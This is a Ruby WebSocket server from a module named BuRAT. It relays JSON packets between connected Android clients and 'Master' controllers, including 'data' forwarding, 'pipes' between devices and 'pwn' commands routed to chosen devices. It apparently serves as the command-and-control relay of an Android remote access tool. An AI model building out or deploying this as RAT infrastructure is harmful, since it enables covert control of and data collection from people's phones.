require 'faye/websocket'
require 'json'

module BuRAT
  class WebSocketServer
    KEEPALIVE_TIME = 15 # in seconds

    def initialize(app)
      @app     = app
      @androids = []
    end

    def call(env)
      if Faye::WebSocket.websocket?(env)
        ws = Faye::WebSocket.new(env, nil, {ping: KEEPALIVE_TIME })

        # OPEN
        ws.on :open do |event|

        end

        # MESSAGE
        ws.on :message do |event|
          begin
            packet = JSON.parse(event.data) # parse packet

            header = packet['header']       # header
            payload = packet['payload']     # payload
            trailer = packet['trailer']     # trailer

            p "#{header} #{trailer}"

            if header == "androids" then     # clients - list of clients
              packet = packet("androids", @androids, 'deathnote')
              ws.send(packet)
            elsif header == "android" then   # client - client identification
              android = @androids.find { |android| android["id"] == payload["id"] }
              payload.store("status", "Online")
              payload.store("ws", ws)
              payload["inators"].each { |inator| inator.store("pipes", Array.new) }
              android == nil ? @androids << payload : android.replace(payload)
              packet = packet("android", payload, "disconnected")
              masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
              masters.each { |master| master["ws"].send(packet) }
            elsif header == "data" then     # data - send to master and pipe
              packet = packet("data", payload, trailer)
              masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
              masters.each { |master| master["ws"].send(packet) }
              #pipe
              android = @androids.find { |android| android["id"] == payload["android"] }
              inator = android["inators"].find { |inator| inator["code"] == payload["inator"] }
              inator["pipes"].each do |pipe|
                android = @androids.find { |android| android["id"] == pipe["android"] }
                payload["android"] = pipe["android"]
                payload["inator"] = pipe["inator"]
                packet = packet("pwn", payload, trailer)
                android["ws"].send(packet)
              end
            elsif header == "pwn" then      # pwn - send to other clients
              packet = packet("pwn", payload, trailer)
              android = @androids.find { |android| android["id"] == payload["android"]}
              android["ws"].send(packet)
            elsif header == "pipe" then
              android = @androids.find { |android| android["id"] == payload["android_in"] }
              inator = android["inators"].find { |inator| inator["code"] == payload["inator_in"] }
              case payload["switch"]
              when "open"
                inator["pipes"] << {"android" => payload["android_out"], "inator" => payload["inator_out"]}
              when "close"
                inator["pipes"].delete({"android" => payload["android_out"], "inator" => payload["inator_out"]})
              end
              packet = packet("android", android, "pipe")
              masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
              masters.each { |master| master["ws"].send(packet) }
            end
          rescue
            #ws.send(event.data)
            #some server stuff here if error is packet is not json
          end
        end

        # CLOSE
        ws.on :close do |event|
          android = @androids.find { |android| android["ws"] == ws }
          android["status"] = "Offline"
          android["ws"] = nil
          packet = packet('android', android, "disconnected")
          masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
          masters.each { |master| master["ws"].send(packet) }
        end

        # Return async Rack response
        ws.rack_response

      else
        @app.call(env)
      end
    end

    private
    def packet(header, payload, trailer)
      {'header' => header, 'payload' => payload, 'trailer' => trailer}.to_json
    end

  end
end
